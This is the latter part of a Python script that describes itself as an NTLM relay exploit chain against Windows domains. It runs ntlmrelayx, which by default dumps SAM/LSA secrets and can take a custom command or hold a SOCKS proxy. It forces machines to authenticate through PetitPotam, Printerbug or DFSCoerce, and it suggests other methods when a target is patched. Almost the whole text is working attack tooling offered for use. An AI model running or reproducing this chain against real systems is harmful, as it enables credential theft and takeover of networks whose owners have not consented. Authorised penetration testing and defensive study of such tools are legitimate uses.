                        log("FAIL", "..", "You need a different relay target, or use --smb-signing-is-on for LDAPS relay.", C.RED)
                        log_result("Relay target signing check", False, "signing enabled")
                    elif "signing:false" in low:
                        log("SMB", "ok", f"SMB signing is {C.GREEN}{C.BOLD}OFF{C.RST} on relay target (good for relay)", C.GREEN)
                        log_result("Relay target signing check", True, "signing disabled")
            except Exception as e:
                log("WARN", "!!", f"Could not check signing: {e}", C.YELLOW)

        relay_bin = find_ntlmrelayx()
        if not relay_bin:
            log("FAIL", "!!", "No ntlmrelayx binary found on PATH or in venv", C.RED)
            log_result("ntlmrelayx binary", False, "not found")
            sys.exit(1)
        log("SMB", "ok", f"Using relay binary: {relay_bin}")

        # cmd = [relay_bin, "-t", target, "-smb2support"]
        cmd = [sys.executable, relay_bin, "-t", target, "-smb2support"]
        if custom_command:
            cmd.extend(["-c", custom_command])
            log("RELAY", "..", f"Custom command on relay: {custom_command}")
        else:
            log("RELAY", "..", "Default action: secretsdump (dump SAM/LSA)")
        if socks:
            cmd.append("-socks")
            log("RELAY", "..", "SOCKS proxy enabled")

    tool_path = check_tool(cmd[0])
    if not tool_path:
        log_result("ntlmrelayx binary", False, f"{cmd[0]} not found")
        sys.exit(1)

    log("SMB", ">>", f"Launch: {C.DIM}{' '.join(cmd)}{C.RST}")
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    log("SMB", "ok", f"ntlmrelayx started (PID {proc.pid})")
    log("SMB", "..", f"Listening on :445 for inbound NTLM auth...")
    log_result("ntlmrelayx started", True, f"PID {proc.pid}")

    monitor = RelayMonitor(proc, is_ldaps_mode=smb_signing)
    monitor.start()

    return proc, monitor


# ═══════════════════════════════════════════════
# Step 4: Authentication coercion
# ═══════════════════════════════════════════════
def run_coercion(target_ip, domain, user, password, method="PetitPotam"):
    log_step(4, f"TRIGGER COERCION ({method.upper()})")

    rpc_svc = {"PetitPotam": "MS-EFSRPC (EFS)", "Printerbug": "MS-RPRN (Print Spooler)",
               "DFSCoerce": "MS-DFSNM (DFS)"}.get(method, "Unknown")
    log("RPC", ">>", f"Method: {C.MAG}{C.BOLD}{method}{C.RST} using {rpc_svc}")
    log("RPC", ">>", f"Coercion target: {C.BOLD}{target_ip}{C.RST}")
    log("RPC", ">>", f"Callback listener: {C.YELLOW}{STATIC_DNS_RECORD}{C.RST}")

    # Pre-flight: auth check
    nxc_bin = check_tool("nxc")
    if nxc_bin:
        log("SMB", ">>", f"Pre-flight: verifying creds against coercion target...")
        try:
            ar = subprocess.run(
                [nxc_bin, "smb", target_ip, "-d", domain, "-u", user, "-p", password],
                capture_output=True, text=True, timeout=15
            )
            for line in ar.stdout.strip().splitlines():
                log("SMB", "<<", line)
                if "[-]" in line and "[+]" not in line:
                    log("FAIL", "!!", f"{C.BG_RED}{C.WHITE} Auth FAILED to coercion target. Coercion won't trigger! {C.RST}")
                    log_result("Coercion target auth", False, "bad creds or access denied")
                elif "[+]" in line:
                    log("SMB", "ok", "Creds valid on coercion target", C.GREEN)
                    log_result("Coercion target auth", True)
        except Exception as e:
            log("WARN", "!!", f"Auth pre-flight error: {e}", C.YELLOW)

    if check_port(target_ip, 135):
        log("RPC", "ok", f"{target_ip}:135 (RPC endpoint mapper) reachable", C.GREEN)
    else:
        log("RPC", "!!", f"{target_ip}:135 is closed. Coercion may fail!", C.RED)

    if check_port(target_ip, 445):
        log("SMB", "ok", f"{target_ip}:445 (SMB, used by coercion transport) reachable", C.GREEN)
    else:
        log("SMB", "!!", f"{target_ip}:445 closed. Coercion cannot reach the target!", C.RED)

    if method == "Printerbug":
        log("RPC", "..", "Printerbug requires Print Spooler service running on target")
    elif method == "PetitPotam":
        log("RPC", "..", "PetitPotam targets EFS (Encrypting File System) RPC interface")
        log("RPC", "..", "Patched on some DCs (KB5005413+). If patched, try DFSCoerce or Printerbug.")
    elif method == "DFSCoerce":
        log("RPC", "..", "DFSCoerce targets DFS Namespace service. Less commonly patched.")

    # Build the nxc coercion command
    if not nxc_bin:
        log("FAIL", "!!", "nxc not found, cannot trigger coercion", C.RED)
        log_result("Coercion trigger", False, "nxc missing")
        return

    cmd_list = [
        nxc_bin, "smb", target_ip,
        "-d", domain,
        "-u", user,
        "-p", password,
        "-M", "coerce_plus",
        "-o", f"M={method}", f"L={STATIC_DNS_RECORD}"
    ]
    log("RPC", ">>", f"cmd: nxc smb {target_ip} -d {domain} -u {user} -M coerce_plus -o M={method} L=...")

    log("RPC", ">>", f"{C.BOLD}Firing coercion now...{C.RST}")
    proc = subprocess.Popen(
        cmd_list,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    try:
        stdout, stderr = proc.communicate(timeout=30)
        stdout_s = stdout.decode(errors="replace").strip()
        stderr_s = stderr.decode(errors="replace").strip()

        if stdout_s:
            log("RPC", "<<", f"--- coercion output ---")
            for line in stdout_s.splitlines():
                if "STATUS_ACCESS_DENIED" in line or "ERROR" in line.upper():
                    log("RPC", "!!", line, C.RED)
                elif "SUCCESS" in line.upper() or "[+]" in line:
                    log("RPC", "ok", line, C.GREEN)
                else:
                    log("RPC", "<<", line)

        if stderr_s:
            for line in stderr_s.splitlines():
                log("RPC", "!!", line, C.YELLOW)

        combined = stdout_s + stderr_s
        if "STATUS_ACCESS_DENIED" in combined:
            log("FAIL", "!!", f"{C.BG_RED}{C.WHITE} Coercion DENIED. The RPC method may be patched or blocked. {C.RST}")
            log("FAIL", "..", "Try a different method: -M Printerbug or -M DFSCoerce", C.YELLOW)
            log_result("Coercion trigger", False, "access denied")
        elif "STATUS_OBJECT_NAME_NOT_FOUND" in combined:
            log("FAIL", "!!", "RPC interface not found. Service may not be running.", C.RED)
            log_result("Coercion trigger", False, "service not found")
        elif proc.returncode != 0:
            log("WARN", "!!", f"nxc exited with code {proc.returncode}", C.YELLOW)
            log_result("Coercion trigger", False, f"exit code {proc.returncode}")
        else:
            log("RPC", "ok", "Coercion command completed", C.GREEN)
            log_result("Coercion trigger", True)

    except subprocess.TimeoutExpired:
        proc.kill()
        log("RPC", "!!", "Coercion command timed out (30s)", C.RED)
        log_result("Coercion trigger", False, "timeout")

    log("SMB", "..", "Waiting 10s for NTLM callback to arrive at :445...")
    time.sleep(10)


# ═══════════════════════════════════════════════
# Final summary
# ═══════════════════════════════════════════════
def print_summary(relay_monitor=None):
    print(f"\n{C.BOLD}{C.WHITE}{'='*60}{C.RST}")
    print(f"  {C.BOLD}{C.WHITE}CHAIN SUMMARY{C.RST}")
    print(f"{C.BOLD}{C.WHITE}{'='*60}{C.RST}")

    all_pass = True
    for step, passed, detail in CHAIN_LOG:
        c = C.GREEN if passed else C.RED
        icon = "+" if passed else "x"
        line = f"  {c}{icon} {step}{C.RST}"
        if detail:
            line += f" {C.DIM}({detail}){C.RST}"
        print(line)
        if not passed:
            all_pass = False

    if relay_monitor:
        print()
        print(f"  {C.BOLD}{C.WHITE}RELAY DIAGNOSIS{C.RST}")
        stage_name = relay_monitor.STAGE_NAMES.get(relay_monitor.stage, "Unknown")
        stage_color = C.GREEN if relay_monitor.stage >= RelayMonitor.STAGE_RELAY_AUTH else C.YELLOW if relay_monitor.stage >= RelayMonitor.STAGE_CALLBACK else C.RED
        print(f"  Relay reached: {stage_color}{C.BOLD}{stage_name}{C.RST}")
        print()
        for msg, color in relay_monitor.get_diagnosis():
            print(f"  {color}  {msg}{C.RST}")
    elif all_pass:
        print()
        print(f"  {C.DIM}  (Relay output was not monitored){C.RST}")

    if not all_pass:
        print()
        first_fail = next((s for s, p, d in CHAIN_LOG if not p), None)
        print(f"  {C.RED}{C.BOLD}Chain broke at: {first_fail}{C.RST}")
        print(f"  {C.DIM}  Fix the first failure above and re-run.{C.RST}")
    print()


# ═══════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="NTLM relay exploit chain with full protocol tracing (cross-platform)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{C.BOLD}Example:{C.RST}
  python smb_no_signing_gg.py \\
    -u "CORP\\\\jsmith" \\
    -p "Summer2025!" \\
    -d 192.168.1.50 \\
    --dns-ip 10.10.10.1 \\
    --dc-fqdn dc01.corp.local \\
    --relay-target srv01.corp.local \\
    --coerce-target 10.10.10.20 \\
    -M PetitPotam
"""
    )
    parser.add_argument("-u", "--username", required=True, help="DOMAIN\\\\user")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-d", "--attacker-ip", required=True, help="Your attacker IP")
    parser.add_argument("--dns-ip", required=True, help="DC IP (DNS server)")
    parser.add_argument("--dc-fqdn", help="DC FQDN (e.g. dc01.corp.local)")
    parser.add_argument("--dc-ip", help="DC IP (if no FQDN)")
    parser.add_argument("--relay-target", required=True,
                        help="FQDN of the machine the captured NTLM auth is forwarded TO")
    parser.add_argument("--coerce-target", required=True,
                        help="IP of the machine you trigger to authenticate back to you")
    parser.add_argument("--custom-command", help="Custom command instead of secretsdump")
    parser.add_argument("--socks", action="store_true",
                        help="Hold the relayed session open as a SOCKS proxy on :1080")
    parser.add_argument("--smb-signing-is-on", action="store_true",
                        help="Switch to LDAPS relay with --remove-mic when relay target has SMB signing on")
    parser.add_argument("-M", "--method", default="PetitPotam",
                        choices=["PetitPotam", "Printerbug", "DFSCoerce"])
    parser.add_argument("--capture", action="store_true", help="Run packet capture in background")
    parser.add_argument("--no-debug", action="store_true", help="Suppress debug output")
    args = parser.parse_args()

    global DEBUG
    if args.no_debug:
        DEBUG = False

    if not args.dc_fqdn and not args.dc_ip:
        parser.error("Either --dc-fqdn or --dc-ip must be provided")

    dc_identifier = args.dc_fqdn or args.dc_ip

    # Platform notice
    if IS_WINDOWS:
        log("INFO", "..", f"Running on {C.YELLOW}Windows{C.RST} ({platform.version()})")
        log("INFO", "..", "Port 445 conflict will be handled automatically if running as admin.")
    else:
        log("INFO", "..", f"Running on {C.GREEN}Linux{C.RST} ({platform.version()})")

    print_flow_diagram(args)

    # ── Environment overview ──
    log_step(0, "ENVIRONMENT CHECK")
    log("INFO", "..", "Parsed arguments:")
    log_params({
        "username": args.username,
        "attacker_ip": args.attacker_ip,
        "dns_ip": args.dns_ip,
        "dc_fqdn": args.dc_fqdn or "(not set)",
        "dc_ip": args.dc_ip or "(not set)",
        "relay_target": args.relay_target,
        "coerce_target": args.coerce_target,
        "method": args.method,
        "smb_signing_is_on": args.smb_signing_is_on,
        "platform": "Windows" if IS_WINDOWS else "Linux",
    })

    # Tool check
    relay_bin = find_ntlmrelayx()
    if relay_bin:
        log("INFO", "ok", f"ntlmrelayx found as: {relay_bin}")
    else:
        log("WARN", "!!", "ntlmrelayx NOT FOUND", C.RED)
    check_tool("nxc")
    if IS_WINDOWS:
        # dig is optional on Windows since we use dnspython
        log("INFO", "..", "DNS resolution will use dnspython (dig not required on Windows)")
    else:
        check_tool("dig")

    # Resolve relay target
    relay_host = args.relay_target
    for prefix in ["smb://", "ldaps://", "ldap://"]:
        relay_host = relay_host.replace(prefix, "")
    relay_host = relay_host.split("/")[0]
    try:
        resolved = socket.gethostbyname(relay_host)
        log("DNS", "ok", f"Relay target {relay_host} resolves to {resolved}")
        if resolved == args.coerce_target:
            log("WARN", "!!", f"{C.YELLOW}Relay target == coercion target (self-relay). "
                f"Machine accounts are usually not local admin on themselves!{C.RST}")
    except socket.gaierror:
        log("DNS", "!!", f"Cannot resolve relay target {relay_host}", C.RED)

    port_scan(args.dns_ip, "DC/DNS")
    if args.coerce_target != args.dns_ip:
        port_scan(args.coerce_target, "Coercion target")

    # ── Optional packet capture ──
    pcap = None
    if args.capture:
        pcap = PacketCapture()
        pcap.start()

    # ── Connection monitor ──
    conn_monitor = ConnectionMonitor()
    conn_monitor.start()

    # ── Execute chain ──
    run_dnstool(args.username, args.password, args.attacker_ip, args.dns_ip, dc_identifier)

    if args.dc_fqdn:
        domain_name = ".".join(args.dc_fqdn.split(".")[1:])
    else:
        if "\\" in args.username:
            domain_name = args.username.split("\\")[0].lower()
        else:
            domain_name = "local"

    full_record = f"{STATIC_DNS_RECORD}.{domain_name}"
    log("DNS", "..", f"Full record to verify: {C.YELLOW}{full_record}{C.RST}")

    if not wait_for_dns_record(full_record, args.dns_ip, timeout=60):
        print_summary(None)
        sys.exit(1)

    ntlmrelay_proc, relay_monitor = start_ntlmrelayx(
        args.relay_target, args.custom_command, args.socks, args.smb_signing_is_on,
        args.dc_ip, args.dc_fqdn, args.dns_ip
    )
    time.sleep(5)

    if ntlmrelay_proc.poll() is not None:
        log("SMB", "!!", f"{C.BG_RED}{C.WHITE} ntlmrelayx DIED (exit code {ntlmrelay_proc.returncode}) {C.RST}", C.RED)
        log("SMB", "..", "Usually means port 445 conflict or bad arguments.", C.RED)
        log_result("ntlmrelayx running", False, f"exited {ntlmrelay_proc.returncode}")
        print_summary(relay_monitor)
        sys.exit(1)

    domain, user = args.username.split("\\", 1)
    run_coercion(args.coerce_target, domain, user, args.password, args.method)

    log("RELAY", "..", "Waiting 15s for relay output to settle...")
    time.sleep(15)
    print_summary(relay_monitor)

    print(f"{C.BOLD}[*] Exploit chain triggered. Watching for relay activity...{C.RST}")
    print(f"{C.DIM}    Press Ctrl+C to stop.{C.RST}")
    if pcap:
        print(f"{C.DIM}    Packet capture: {pcap.outfile}{C.RST}")

    try:
        ntlmrelay_proc.wait()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Stopping...{C.RST}")
        ntlmrelay_proc.terminate()
        relay_monitor.stop()
        conn_monitor.stop()
        if pcap:
            pcap.stop()
        print_summary(relay_monitor)

        # On Windows, offer to restart LanmanServer
        if IS_WINDOWS:
            print(f"\n{C.YELLOW}[*] Remember to restart the Windows SMB service:{C.RST}")
            print(f"    {C.CYAN}net start LanmanServer{C.RST}\n")


if __name__ == "__main__":
    main()
